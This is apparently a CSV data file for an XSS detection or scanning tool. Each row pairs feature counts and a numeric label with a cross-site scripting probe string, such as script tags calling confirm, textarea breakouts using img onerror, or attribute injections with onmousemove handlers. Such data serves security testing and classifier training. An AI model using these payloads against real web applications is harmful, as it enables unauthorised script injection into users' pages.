op_html,op_attr,op_js,op_vbs,op_quot,esc_double,esc_single,esc_back,esc_left,esc_right,esc_alert,esc_prompt,esc_confirm,esc_balert,esc_sscript,esc_escript,esc_msgbox,label,inspection_strings
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,1,1,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
7,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,1,1,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,1,0,1,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,1,0,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,1,1,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,1,1,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,1,0,1,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,1,1,1,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,1,1,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,1,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,1,0,1,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,1,1,1,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,1,0,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,1,1,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,1,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,1,1,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,0,1,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,1,0,1,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,1,1,1,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,1,1,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,1,0,1,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,1,1,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,1,0,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,1,1,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,1,0,1,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,1,1,1,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,1,1,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,1,1,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,1,0,1,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,1,1,1,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,1,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,1,0,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,1,1,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,1,0,1,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,1,1,1,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,1,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,1,1,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,1,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
10,5,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,1,0,1,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,1,1,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,1,0,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,1,1,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,1,0,1,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,1,1,1,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,1,1,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,1,1,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,1,0,1,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,1,1,1,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,1,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,1,0,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,1,1,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,1,0,1,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,1,1,1,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,1,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,1,1,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,0,1,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,1,1,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,1,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,1,1,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
